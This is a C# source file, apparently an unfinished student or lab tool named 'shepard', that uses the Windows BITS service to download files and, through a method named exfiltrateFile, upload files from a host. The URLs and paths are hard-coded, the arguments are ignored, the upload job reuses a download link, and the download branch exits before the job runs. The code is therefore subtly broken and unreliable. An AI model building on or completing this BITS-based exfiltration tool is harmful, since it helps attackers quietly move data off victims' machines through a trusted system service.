using System;
using System.Net.Cache;
using System.Net.Configuration;
using System.Threading.Tasks;
using BITS = BITSReference1_5;

namespace shepard
{
    class JobObj
    {
        static BITS.BackgroundCopyManager1_5 mgr;
        static BITS.GUID jobGuid;
        static BITS.IBackgroundCopyJob job;

        public JobObj()
        {
            mgr = new BITS.BackgroundCopyManager1_5();
        }

        public static void Main(string[] args)
        {
            if (args.Length == 0) { return; }

            JobObj jo = new JobObj();

            if (args.Length == 3)
            {
                if (args[0] == "-d")
                {
                    jo.downloadFile(args[1], args[2]);
                    Console.WriteLine(args[1] + "string " + args[2]);
                    return;
                }
                else if (args[0] == "-e")
                {
                    jo.exfiltrateFile(args[1], args[2]);
                }
            }else { return; }

            jo.executeJob();
            //string inputaddr = "23.52.161.19";
            //System.Net.IPHostEntry hostEntry = System.Net.Dns.GetHostEntry(inputaddr);
            // System.Console.WriteLine(hostEntry.HostName);
            //job.AddFile(hostEntry.HostName, @"C:\Users\enzod\Desktop\Server2016.pdf");
        }

        private void downloadFile(string remoteLoc, string writeLoc)
        {
            mgr.CreateJob("QD", BITS.BG_JOB_TYPE.BG_JOB_TYPE_DOWNLOAD, out jobGuid, out job);
            job.AddFile("https://aka.ms/WinServ16/StndPDF", @"C:\Users\student\Desktop\Server2016.pdf");
        }

        private void exfiltrateFile(string remoteLoc, string writeLoc)
        {
            mgr.CreateJob("QU", BITS.BG_JOB_TYPE.BG_JOB_TYPE_UPLOAD, out jobGuid, out job);
            job.AddFile("https://aka.ms/WinServ16/StndPDF", @"C:\Users\student\Desktop\Server2016.pdf");
        }
        //somewhere in main, consisent loop for input of command

        private void executeJob()
        {
            job.Resume();
            bool jobIsFinal = false;
            while (!jobIsFinal)
            {
                BITS.BG_JOB_STATE state;
                job.GetState(out state);
                switch (state)
                {
                    case BITS.BG_JOB_STATE.BG_JOB_STATE_ERROR:
                    case BITS.BG_JOB_STATE.BG_JOB_STATE_TRANSFERRED:
                        job.Complete();
                        break;

                    case BITS.BG_JOB_STATE.BG_JOB_STATE_CANCELLED:
                    case BITS.BG_JOB_STATE.BG_JOB_STATE_ACKNOWLEDGED:
                        jobIsFinal = true;
                        break;
                    default:
                        Task.Delay(500); // delay a little bit
                        break;
                }
            }
        }
    }
}
